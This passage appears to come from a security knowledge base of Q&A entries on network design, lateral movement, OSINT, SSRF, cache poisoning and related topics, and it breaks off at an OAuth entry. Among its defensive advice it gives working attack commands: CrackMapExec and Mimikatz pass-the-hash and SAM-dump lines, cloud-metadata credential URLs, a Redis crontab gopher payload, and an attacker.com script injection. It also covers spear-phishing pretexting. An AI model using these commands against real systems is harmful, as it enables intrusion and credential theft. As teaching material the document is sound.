DMZ (Demilitarised Zone): network segment between internet and internal network; hosts public-facing services; limits blast radius of compromise. Purpose: public-facing servers must be accessible from internet; if directly on internal network: compromise gives attacker immediate internal access; DMZ: isolated segment; compromise of DMZ server has restricted internal access; reduces attack surface. Architecture: classic three-zone: internet, DMZ, internal; two firewalls (preferred): internet-facing firewall (external): allows internet to reach DMZ servers (80/443, 25, 53 etc.); blocks everything else; internal firewall (internal): controls DMZ to internal communication; only specific required flows (app server to database on specific port); or single firewall with three interfaces (less preferred; single point of failure; firewall compromise exposes all zones). What goes in DMZ: web servers (Nginx, Apache, IIS): serve public websites; mail servers (MX): receive inbound email; DNS servers (authoritative): respond to public DNS queries; VPN concentrators: terminate remote access VPN; WAF / load balancers: front-end traffic; reverse proxies: Nginx, HAProxy forwarding to internal app servers; what does not go in DMZ: databases (application databases go on internal network); internal applications; Active Directory domain controllers; file servers; anything with internal sensitive data. Traffic rules: internet to DMZ: allow: 80/443 to web servers, 25 to mail server, 53 to DNS; deny all else; DMZ to internal: allow only specific required: web server to app server (8080), app server to database (5432), mail server to internal relay; deny all other DMZ to internal; internal to DMZ: allow: management traffic from management subnet to DMZ servers (SSH 22, RDP 3389 from jump server only); deny direct internet access from internal (all internet via proxy); DMZ to internet: allow: HTTP/HTTPS from DMZ servers for software updates via proxy; deny all other outbound from DMZ. Security controls in DMZ: DMZ servers hardened: minimal software, OS patched, no unnecessary services; monitoring: all DMZ traffic logged; alerts on anomalous patterns; intrusion detection on DMZ segment; separate credentials: DMZ admin accounts separate from internal admin accounts; if DMZ credentials stolen: cannot pivot to internal with same credentials; egress filtering on DMZ: DMZ servers should not initiate connections to unexpected destinations (indicator of compromise).
What is network monitoring and packet analysis?

Network monitoring and packet analysis: capture and analyse network traffic for security and troubleshooting. Tools: Wireshark: GUI packet analyser; most widely used; captures live traffic or opens PCAP files; display filters: ip.addr == 192.168.1.1 (traffic to/from IP); tcp.port == 443 (HTTPS traffic); http (HTTP traffic); frame contains password (packets containing string); follow TCP stream: reconstruct full session; useful for: HTTP inspection, credentials in cleartext, malware C2 analysis; tshark: command-line Wireshark; scriptable; tshark -r capture.pcap -Y http.request (filter HTTP requests); tshark -r capture.pcap -T json > output.json (JSON output for analysis); tcpdump: lightweight command-line capture; tcpdump -i eth0 port 80 (capture HTTP); tcpdump -i any -w capture.pcap (write all traffic to file); Zeek (formerly Bro): network analysis framework; generates structured logs from traffic (conn.log, http.log, dns.log, ssl.log, files.log); excellent for SIEM integration; run detection scripts; netflow: connection-level metadata (no payload); Ntopng: flow analysis and visualisation. Packet analysis for security: HTTP analysis: identify cleartext credentials, session tokens, sensitive data; observe web attacks (SQLi in URL, XSS in response); scan traffic (many requests to different URLs from same IP); DNS analysis: identify C2 beaconing (periodic queries to same domain); DGA domains (high entropy, unusual patterns); DNS tunneling (high volume, large TXT records, long subdomains); TLS analysis: JA3 fingerprint: hash of TLS client hello parameters (ciphers, extensions, curves); identifies client TLS library; malware often has distinctive JA3; JA3S: server fingerprint; JA3 + JA3S pair identifies application pair; Ja3er.com: lookup JA3 hashes against database; file extraction: Wireshark and Zeek extract files from HTTP, FTP, SMB traffic; scan extracted files with AV or VirusTotal; detect malware downloads; credential harvesting: filter: tcp contains password OR tcp contains Authorization OR tcp contains Cookie; look for cleartext credentials in unencrypted protocols (HTTP, FTP, SMTP). PCAP analysis workflow: open in Wireshark; statistics -> conversations (top talkers by IP pair and port); review unusual conversations (large data, unusual port, unusual destination); filter to suspicious conversation; follow TCP stream; analyse content; extract files if present; use tshark for automated pattern matching on large PCAP files; Zeek for structured log generation from PCAP.
What is lateral movement via SMB and Windows shares?

SMB (Server Message Block) lateral movement: use Windows file sharing protocol to move between systems; common internal network attack technique. Why SMB for lateral movement: SMB port 445 open between most Windows hosts; file shares facilitate legitimate file transfer (used for lateral movement); built-in Windows commands for SMB; PsExec, WMI, DCOM all use SMB; many internal networks do not restrict workstation-to-workstation SMB. Techniques: PsExec: upload service binary via SMB Admin$; install and run service; provides interactive shell; event: Service 7045 (PSEXESVC installed); event 4648 (logon with explicit credentials if credentials passed); smbexec.py (Impacket): similar to PsExec; CrackMapExec (CME/NetExec): cme smb TARGETRANGE -u admin -p password --shares (enumerate shares); cme smb TARGETRANGE -u admin -p password -x whoami (execute command via SMB); cme smb TARGETRANGE -u admin -p password --sam (dump SAM hashes). Pass-the-Hash via SMB: NTLM authentication: SMB sends challenge; client responds with NTLM hash of password; if attacker has NTLM hash (from LSASS dump or SAM): can authenticate without knowing plaintext password; Impacket: smbclient.py -hashes :NTLM_HASH domain/admin@TARGET; CrackMapExec: cme smb TARGET -u admin -H NTLM_HASH --shares; Mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd (pass-the-hash shell). Share enumeration: net view \\TARGET (list shares); smbclient.py (list shares without credentials if null session); find sensitive shares: IT$ (IT tools), SYSVOL (Group Policy files), NETLOGON, backup shares, file shares with write access. Shares for foothold: find SYSVOL write access (GPO modification for code execution); find shares with write access (drop DLL or binary in folder where admin will execute); find shares with sensitive data (credentials, SSH keys, config files, backups). Detection: Event 5145 (Network share access): connection to administrative shares (C$, ADMIN$, IPC$); Event 7045 (PsExec service creation): PSEXESVC service; Sysmon Event 3: network connections from administrative tools; CME detection: rapid sequential authentication across multiple hosts from same source; alert: workstation-to-workstation SMB (not server-to-workstation); EDR: lateral movement detection via process tree (services.exe spawning cmd.exe from network). Prevention: firewall: block workstation-to-workstation SMB (only allow workstation to file server, not peer-to-peer); disable SMB on workstations (reduce attack surface); Admin$ and C$ shares: disable via registry if not needed for management; strong authentication: SMB signing required (prevents relay attacks); Kerberos authentication (no NTLM pass-the-hash if Kerberos enforced -- though Kerberos tickets can be passed instead).
What is OSINT for social engineering reconnaissance?

Social engineering OSINT: gather information about target individuals and organisation to craft convincing social engineering attacks. Target profiling -- individuals: LinkedIn: name, role, years at company, previous employers, skills, connections, education, LinkedIn headline (reveals priorities); email format: first.last@company.com, flast@company.com, firstname@company.com; determine from found email addresses or theHarvester; Twitter/X, Facebook, Instagram: hobbies, life events, personal connections, opinions; valuable for rapport building; personal website or blog; conference talks (YouTube): know their expertise, opinions, vocabulary; GitHub: personal projects, tech stack preferences; Keybase, Stack Overflow, HackerNews profile. Target profiling -- organisation: website: key personnel (About Us page), news releases (product launches, partnerships, acquisitions), job postings (technology stack, business initiatives), contact information; LinkedIn company page: company size, departments, office locations, employee list; Glassdoor: internal processes, management style, pain points; news articles: recent events, legal issues, security incidents; annual reports (public companies): financial details, strategic priorities, vendor relationships; regulatory filings (SEC EDGAR): executive compensation, major customers, material risks; vendor relationships: event sponsorships, partner pages, case studies. Pre-texting material from OSINT: create convincing pretext: I am calling from Salesforce support about your recent migration (Glassdoor review mentioned Salesforce migration); use employee names obtained from LinkedIn; reference specific projects or events (saw your talk at RSA on X); simulate peer knowledge (mention colleague names); spear phishing customisation: personalise phishing email with: target name, role, recent event (saw your LinkedIn post about the acquisition), organisation context, legitimate-appearing request. Defensive implications: minimise public footprint: LinkedIn privacy settings; social media sharing policies; information classification (what employees can share publicly about technology and projects); job posting security: avoid revealing specific security tool names, exact software versions, security gaps in job descriptions; employee awareness: train employees on information they share publicly; periodic OSINT assessments on key executives; DMARC/DKIM/SPF: prevent spoofing of company domain in social engineering emails.
What is runtime application self-protection (RASP)?

RASP (Runtime Application Self-Protection): security technology integrated into application runtime; monitors and protects from within; detects and blocks attacks during execution. How RASP works: instrumented inside application: RASP agent intercepts application function calls; hooks into language runtime (Java JVM,.NET CLR, Node.js V8, Python interpreter, PHP); monitors: SQL queries before execution, file system access, OS commands, network calls, serialisation/deserialisation; real-time analysis: when sensitive function called: inspect context (what data triggered this call? Is it in expected format?); compare to known attack patterns; legitimate: allow execution; attack: block; report; alert. Key capabilities: injection prevention: intercept SQL query execution; if query structure changed by user input: block (parameterised query would not change structure); HTTP response context: know exactly what HTML context script appears in; block XSS more accurately than WAF; detect and block: SSRF (server making unexpected URL requests), command injection, XML injection, path traversal, dangerous deserialization; virtual patching: known vulnerability in application; RASP blocks exploitation attempts while waiting for proper fix. Advantages over WAF: inside application context: RASP knows application state; WAF sees only HTTP traffic; example: RASP knows SQL query expected to have two parameters; extra SQL injected by attacker changes structure; RASP detects structure change and blocks; WAF must rely on pattern matching (easier to bypass); protects encrypted traffic: HTTPS decrypted inside application; RASP sees plaintext after decryption; WAF requires SSL offload; lower false positive rate: context-aware detection; fewer false positives than perimeter WAF. Disadvantages: performance overhead: every sensitive function call instrumented; 3-10% performance overhead typical; application compatibility: must support application language and framework; complex deployments may have issues; vendor lock-in; trust in RASP agent: if RASP has vulnerability or misconfiguration: could introduce issues; defence in depth: RASP complements WAF; does not replace; RASP + WAF: WAF blocks known attack signatures at perimeter; RASP blocks contextual attacks that reach application. Products: Contrast Security: strong Java and.NET support; runtime detection; Sqreen (Datadog): developer-friendly; Hdiv Security; Dynatrace Application Security (RASP mode); Micro Focus Fortify RASP; open-source: OWASP AppSensor (detection) + custom response logic.
What is SSL pinning and how do you implement it?

SSL pinning (certificate pinning): embed expected certificate or public key in application; reject connections to servers presenting different certificates even if CA-signed valid. Why pinning: standard TLS validates certificate against trusted CA store; all CAs trusted; compromised CA or malicious CA could issue valid cert for your domain; corporate SSL inspection proxies present their own certificate; pinning prevents all MITM including with valid certificates. Pinning types: certificate pinning: pin exact certificate DER bytes or fingerprint; most specific; breaks when certificate rotates (typically annually); public key pinning (SPKI): pin SubjectPublicKeyInfo hash; survives certificate renewal (new cert same key pair); CA pinning: pin intermediate or root CA; any cert from that CA accepted; less specific but simpler rotation. Implementation -- mobile (Android, OkHttp): val certificatePinner = CertificatePinner.Builder().add(api.example.com, sha256/BASE64_HASH).add(api.example.com, sha256/BACKUP_HASH).build(); val client = OkHttpClient.Builder().certificatePinner(certificatePinner).build(); Android Network Security Config: pin-set in network_security_config.xml: <domain-config><domain>api.example.com</domain><pin-set expiration=2025-01-01><pin digest=SHA-256>BASE64_HASH</pin><pin digest=SHA-256>BACKUP_HASH</pin></pin-set></domain-config>. iOS (NSURLSession): URLSession delegate method: urlSession(_:didReceive:completionHandler:); extract server certificate; compare to pinned SPKI hash; call completionHandler(.cancelAuthenticationChallenge) if mismatch; or use TrustKit (Datatheorem): easy pinning library for iOS. Web (HPKP deprecated): HPKP header deprecated 2018; not recommended; alternative: cert-spki subresource integrity for web resources; for web apps: check certificate via fetch and compare hash before sending sensitive data (complex; usually not done). Backup pins: always pin at least two public keys: primary (current certificate public key); backup (next certificate public key, or intermediate CA key); allows rotation: generate new key pair for next certificate; add backup pin before rotating; rotate certificate to new key pair; remove old pin. Pin rotation procedure: add new backup pin to app release; wait for majority of users to update; rotate server certificate to pinned key pair; remove old primary pin in next release; test rotation in staging first. Bypass detection: detect Frida and SSL unpinning frameworks; check process integrity; use native code for pinning (harder to bypass than Java layer); multi-layer pinning; challenge-response with pin validation on server.
What is a supply chain attack and what are recent examples?

Supply chain attack: compromise software or hardware before it reaches target; attacker inserts malicious code or hardware upstream; victims receive trusted software with backdoor. Types: software supply chain: compromise build system or repository; insert malicious code into legitimate software update; victims install update trusting vendor; dependency confusion: attacker publishes malicious package with same name as internal private package on public registry; CI/CD pulls public package instead of private; open source poisoning: compromise maintainer account; push malicious update to popular package; typosquatting: publish package with similar name (requests vs requuests); developer typo installs malicious version; hardware supply chain: counterfeit hardware components; modified hardware with implanted backdoor chip; physical interception and modification of hardware in transit. Famous examples: SolarWinds SUNBURST (2020): Orion network monitoring software build system compromised; malicious DLL (SUNBURST) inserted into Orion update; distributed to 18,000+ customers; infected: US Treasury, State Dept, DHS, 100+ enterprises; attackers: APT29 (SVR, Russian intelligence); NotPetya (2017): initial infection via MEDoc accounting software update system; MEDoc software mandatory for Ukrainian businesses; spread to supply chain of global companies operating in Ukraine; Maersk (shipping), Merck (pharma), FedEx, Mondelez; $10B+ in damages. XZ Utils backdoor (2024): social engineering of xz/liblzma maintainer; backdoor inserted into xz library; targeted SSH daemon via systemd integration on select Linux distributions; discovered by accident (Andres Freund noticed SSH slowdown); would have enabled remote code execution as root. npm/PyPI/RubyGems: multiple incidents: event-stream npm package (2018): new maintainer added malicious code targeting specific Bitcoin wallet; ua-parser-js (2021): npm account compromised; malicious version published; crypto-miner and credential stealer deployed. Defence: SBOM (Software Bill of Materials): track all dependencies; alert on unexpected updates; dependency pinning: pin exact dependency hash (not semver range); verify hash matches on install; sigstore/in-toto: cryptographic supply chain security; sign and verify every step of build pipeline; vendor security assessment: assess software vendors security practices; right to audit; access restriction: MFA for all code repository and registry accounts; minimal committer access; code review: review all changes before merge; automated tools flag unusual changes; separate build environment: no internet access from build system; offline dependency mirror; air-gapped production builds.
What are web cache poisoning attacks?

Web cache poisoning: inject malicious content into web cache; served to all subsequent users requesting same resource; XSS, phishing, or denial of service at scale. How caches work: CDN or reverse proxy caches responses; cache key: typically URL + Host + possibly other headers; if request matches cache key: serve cached response without hitting origin; content served to all users matching that cache key. Cache poisoning mechanism: identify unkeyed inputs: headers or parameters included in response but not in cache key; if included in response: reflect into response; if unkeyed: poisoned response cached; HTTP headers commonly unkeyed: X-Forwarded-Host: used by some applications to construct URLs in response; X-Original-URL, X-Rewrite-URL; Vary header controls which headers are keyed; if Vary does not include a header used in response: unkeyed; example: GET /page HTTP/1.1; Host: target.com; X-Forwarded-Host: attacker.com; Response: <script src=http://attacker.com/script.js> (application uses X-Forwarded-Host to construct URL); if X-Forwarded-Host not in cache key: response cached; next user requests /page: served poisoned response with attacker.com script; XSS for all users requesting that page. DOM-based cache poisoning: unkeyed query parameter reflected into DOM without sanitisation; malicious payload cached in CDN; fat GET (GET requests with body): some caches key on URL only; body not keyed; inject payload in GET body; cached with URL; parameter cloaking: different parsers parse query string differently; inject extra parameter affecting response; cache caches based on first parser interpretation; origin uses second; Cache-Control bypass: Pragma: no-cache or Cache-Control: no-cache forces some caches to forward request; X-Cache-Key header in some implementations affects cache lookup. Detection: Param Miner (Burp Suite extension): discovers unkeyed inputs by comparing cached vs uncached responses; cache poisoning detection via Burp Suite scanner; manual: identify headers reflected in response; test with unique values; check if next request serves cached poisoned response. Prevention: validate Host and X-Forwarded-Host headers against allowlist; cache only safe responses; use Vary header correctly (include all headers that affect response); strip unsafe headers at CDN before hitting origin; Content-Security-Policy to limit impact of injected scripts; X-Forwarded-Host: reject or validate on server; set X-Forwarded-Host in CDN rather than relying on client.
What is broken access control and how do you test for it?

Broken access control: OWASP Top 10 #1 (2021); failure to enforce restrictions on what authenticated users can do; most common and impactful web vulnerability class. Types: IDOR (Insecure Direct Object Reference): access other user objects by changing identifier: GET /api/users/1234/profile (change 1234 to 1235; get another user profile); privilege escalation (vertical): regular user accesses admin functionality: POST /api/admin/users (should be 403; is 200); missing function-level access control: API endpoint secured in frontend but not backend; change role in user object: PUT /api/users/1234 {role: admin}; path traversal: access files outside intended directory; JWT claims manipulation: change user_id or role in JWT payload if weak signature; direct URL access: admin console at /admin accessible without authentication if URL not linked; mass assignment: send user object fields that should not be modifiable by user (admin, role, credits); missing access control in API: GET /api/internal/metrics returns sensitive data without authentication; URL-based access control bypass: /admin/secret accessible; /Admin/secret bypasses filter; missing resource-level check: can view profile but also update it without owning it; Testing methodology: identify object identifiers in requests: user IDs, document IDs, order IDs, ticket IDs in URLs, request bodies, headers, cookies; test identifier manipulation: increment, decrement, GUID enumeration (if sequential), try other format IDs; test different HTTP methods: GET protected, POST/PUT/DELETE on same endpoint not?; map all application roles: guest, user, manager, admin; test every endpoint with each role: lower role accessing higher role function; test horizontal: two accounts same role; can account A access account B data?; test JWT and session token: try manipulating claims (if HS256 weak secret: crack and forge); admin endpoint discovery: common paths (/admin, /management, /api/admin, /internal); test with regular user token; source code review: every API endpoint: where is authorisation check? Is it there? Does it verify object ownership? Automated tools: OWASP ZAP access control scanner; Burp Suite Pro extension; AuthMatrix (Burp extension): test multiple users against all endpoints systematically.
What is deception technology in enterprise security?

Deception technology: plant decoys, traps, and fake assets throughout network; detect attackers as they probe; high-fidelity alerts with virtually zero false positives. Why deception: attackers must discover network before exploiting; any interaction with decoy indicates compromise or reconnaissance; defender advantage: any touch of decoy = malicious (no legitimate user should access decoy); high-confidence detection without signatures. Types: honeypots: full decoy systems (see honeypot entry); honeytokens: fake credentials, API keys, documents, email addresses; placed where attacker would find real ones; any use = alert; decoy accounts: fake user accounts in Active Directory; any authentication attempt = attacker testing stolen credentials; alert immediately; decoy files: documents named interesting things (passwords.xlsx, customer_list.csv, CEO_salary.txt); planted on file shares; any access = attacker surveying data; canarytokens.org: free honeytoken generation; URL-based tokens send email alert on access; decoy DNS names: DNS canary tokens; any DNS query = alert; decoy network services: fake SSH, RDP, SMB services on unused IPs; any connection = network scanner. Enterprise deception platforms: Attivo Networks (now SentinelOne Ranger AD): decoy AD users and computers; detect AD enumeration (BloodHound-style queries trigger alerts when hitting decoys); Illumio: decoys as part of microsegmentation; CounterCraft: full deception orchestration; Smokescreen: network decoys. Honey credentials in Active Directory: create fake admin account: FakeAdmin with realistic name; no privileges but sounds important; any login attempt triggers immediate high-priority alert; complementary: HoneyBadger project monitors account usage. Decoy data in AWS: create fake S3 bucket with honeytokens inside; if attacker finds and accesses: alert; fake IAM access keys (Canarytokens or AWS canary access keys): publish key in code repo as if accidental; any AWS API call with that key triggers alert; Macie ML data classification finds real PII accidentally exposed. Measuring deception effectiveness: dwell time detection: how quickly does deception alert after attacker enters network?; coverage: how many segments have decoys?; alert quality: confirm all deception alerts are true positives (zero false positives by design); integrate with SOAR: deception alert triggers automated response playbook (isolate source IP, notify SOC, preserve forensics).
What is SSRF attack and how do you exploit it in cloud environments?

SSRF in cloud environments: leverage server-side request forgery to access cloud metadata, internal services, and IAM credentials. Cloud metadata endpoints: AWS EC2 IMDSv1: http://169.254.169.254/latest/meta-data/ (no authentication required in v1); useful endpoints: /latest/meta-data/iam/security-credentials/ (list roles attached), /latest/meta-data/iam/security-credentials/ROLENAME (get temporary credentials); IMDSv2: requires PUT token request first: curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds: 21600; then GET with token in header; SSRF cannot use PUT then GET in single HTTP redirect (SSRF typically follows redirect not changes method); GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (requires Metadata: true header); some SSRF vulnerabilities allow custom header injection; Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata: true); Azure IMDS also requires header. Exploiting SSRF for IAM credentials: find SSRF vulnerability in application; fetch IAM role credentials: response: {AccessKeyId: ASIA..., SecretAccessKey:..., Token:..., Expiration:...}; use credentials with AWS CLI: AWS_ACCESS_KEY_ID=..., AWS_SECRET_ACCESS_KEY=..., AWS_SESSION_TOKEN=...; aws sts get-caller-identity (confirm who you are); aws iam get-role-policy (what can this role do?); enumerate S3 buckets: aws s3 ls; access databases, secrets, other services. Privilege escalation via SSRF + IAM: Lambda function with SSRF: Lambda execution role; metadata reveals credentials; Lambda role may have broad AWS permissions; ssrf to get Lambda credentials = AWS API access; SSRF to ECS task metadata: http://169.254.170.2/v2/credentials/UUID (ECS task metadata endpoint); credentials for ECS task role. Chaining SSRF: SSRF to redis/memcache: http://127.0.0.1:6379/; redis command injection via GOPHER protocol: gopher://127.0.0.1:6379/_MULTI%0d%0aSET%0d%0a... (write to crontab via redis); SSRF to K8s API: http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets (if service account has access). SSRF to RCE path: SSRF reads IAM credentials; credentials allow Lambda invoke; invoke Lambda with malicious event; Lambda executes code in AWS account. Prevention: IMDSv2 enforcement: metadata_options.http_tokens = required in Terraform; prevent unauthenticated SSRF from accessing metadata; network: block 169.254.169.254 at WAF or application layer; validate and sanitise URL parameters server-side; allowlist permitted URL destinations; monitoring: GuardDuty detects unusual metadata access patterns (access from unexpected source).
What are common mistakes in security testing methodology?

Common security testing mistakes: pitfalls that lead to incomplete or misleading assessments. Over-reliance on automated scanners: running OWASP ZAP or Nessus and delivering report without manual validation; automated tools: miss business logic vulnerabilities (no tool understands business context); have high false positive rate (report many things to investigate); miss chained vulnerabilities; miss authentication bypass via logic flaws; best practice: automated scanning as first pass; significant manual testing required for quality assessment. Insufficient understanding of application: test application without understanding its purpose, user roles, or business logic; miss: access control issues (do not know who should access what), business logic vulnerabilities (do not know what normal business flow is), sensitive functionality (do not know which endpoints handle payments or PII); best practice: spend time understanding application before testing; review documentation, architecture, business context. Testing only happy path: only test what application is designed to do; miss: what happens with unexpected input, negative test cases (cancel mid-flow), edge cases (empty strings, null values, max integers), out-of-order requests; best practice: systematically test all variations including unexpected. Lack of depth on findings: report vulnerability without fully exploring impact; report SQL injection without demonstrating data extraction; report SSRF without exploring what internal services accessible; best practice: fully exploit each vulnerability to demonstrate true impact; chain vulnerabilities; show end-to-end attack path. Not testing all roles: test only with one user account; miss: horizontal privilege escalation (user A to user B), vertical escalation (user to admin), unauthenticated access; best practice: test with every user role; test transitions between roles. Ignoring header and cookie manipulation: test only URL parameters and POST body; miss: SQL injection in HTTP headers (User-Agent, Referer, X-Forwarded-For), cookie injection, header injection; best practice: test all input points including headers and cookies. Retesting immediately after fix: retest within minutes of fix deployment; developer made partial fix; test confirms fixed; actual bypass exists; best practice: wait for full deployment; understand fix before retesting; test that fix addresses root cause not just specific payload. No documentation during testing: take no notes during test; reconstruct findings from memory at report time; miss findings; misremember details; best practice: document every finding immediately with: URL, method, payload, response, screenshot, timestamp.
What is wireless security WPA3 and how does it improve on WPA2?

WPA3 (Wi-Fi Protected Access 3): Wi-Fi security protocol released 2018; significant security improvements over WPA2. WPA2 weaknesses WPA3 addresses: KRACK (Key Reinstallation Attack, 2017): vulnerability in WPA2 four-way handshake; nonce reuse allows decryption; WPA3 SAE replaces four-way handshake; offline dictionary attacks: WPA2 PSK: capture handshake; crack offline with GPU; WPA3 SAE: no offline cracking possible; brute force attacks: WPA2: no protection against repeated guessing; WPA3: natural resistance; forward secrecy: WPA2: no forward secrecy; capture traffic now, crack key later, decrypt all past traffic; WPA3: Ephemeral session keys; forward secrecy. WPA3 improvements: SAE (Simultaneous Authentication of Equals): replaces WPA2 Pre-Shared Key; based on Dragonfly handshake (RFC 7664); zero-knowledge proof: both sides prove knowledge of password without sending password or guessable hash; mutual authentication: both client and AP authenticate each other; protection against offline dictionary attack: each failed attempt requires full handshake; cannot test many passwords offline; natural brute force protection; forward secrecy: unique session keys per connection even with same PSK. WPA3-Enterprise: 192-bit minimum security suite (Suite B): 256-bit AES (GCMP-256), 384-bit HMAC (HMAC-SHA-384), 384-bit elliptic curve (ECDH/ECDSA P-384); biometric and token authentication support; for government and critical infrastructure. OWE (Opportunistic Wireless Encryption): replaces open (no security) networks; provides encryption without authentication; no password needed; protection against passive eavesdropping on open networks (airports, cafes); does not protect against active MITM (no authentication); Management Frame Protection (802.11w): mandatory in WPA3; prevents deauthentication attacks (cannot spoof deauth frames); WPA2 with MFP optional (802.11w capable). Dragonblood attacks (2019): timing and cache side-channel attacks against WPA3 SAE; allow partial offline attack; patches released; updated implementations correct; demonstration that new protocols also need scrutiny; transition mode: most networks run WPA2/WPA3 mixed mode (backward compatibility); devices that do not support WPA3 use WPA2; weakest-link: WPA2 vulnerabilities still present in transition mode; attacker forces WPA2 connection; full WPA3-only: best security; breaks older devices.
What is security policy and governance?

Security policy and governance: formal structure defining how organisation manages information security; foundation of security programme. Governance framework: board level: set risk appetite; approve security strategy; security budget; CISO reporting line (ideally to CEO or board, not CIO for independence); risk committee; executive level: CISO owns security programme; reports risks and programme status; CTO/CIO: responsible for implementing security in technology; legal: regulatory compliance; incident notification obligations; business units: data owners; responsible for security of their data; security team: technical implementation; monitoring; incident response. Policy hierarchy: policies: high-level statements of intent (management direction); Acceptable Use Policy, Information Security Policy, Password Policy, Data Classification Policy, Remote Work Policy, BYOD Policy, Vendor Management Policy; standards: specific mandatory requirements implementing policies (password minimum 14 characters, MFA required for all cloud systems); procedures: step-by-step instructions how to implement standards (how to enroll MFA, how to respond to phishing); guidelines: recommended practices (not mandatory). Policy development: executive sponsorship: policy must have executive champion; without leadership support: ignored; stakeholder input: affected departments provide input; policies must be practical; legal review: comply with employment law, regulatory requirements; board/executive approval: formal approval process; version control; effective date; review cycle (typically annual). Policy lifecycle: draft, review, approve, communicate, implement, enforce, audit, review; communication: all employees read and acknowledge; annual re-acknowledgement; new hire onboarding; training on key policies. Enforcement: policy violations: disciplinary procedure; security awareness training for first-time minor violations; escalation for serious or repeat violations; consistent enforcement (executive violations treated same as employee violations); technical controls: enforce policies technically where possible (MFA = technical control; not just policy statement). Compliance management: regulatory compliance calendar: which regulations apply? What are audit dates? Map regulatory requirements to internal policies; control library: each control maps to multiple regulatory requirements; SIEM compliance dashboards: continuous control monitoring; audit programme: internal audit verifies policy compliance; external audit (ISO 27001, SOC 2, PCI DSS) verifies independently. Metrics: policy exceptions: how many formal exceptions granted?; policy violations: how many violations per quarter?; policy coverage: what % of risks have policy coverage?; employee acknowledgement rate: what % of employees have signed policies?
What is OAuth 2.0 security and common attack patterns?

OAuth 2.0 security: authorization framework; delegated access without sharing credentials; significant security considerations if implemented incorrectly.
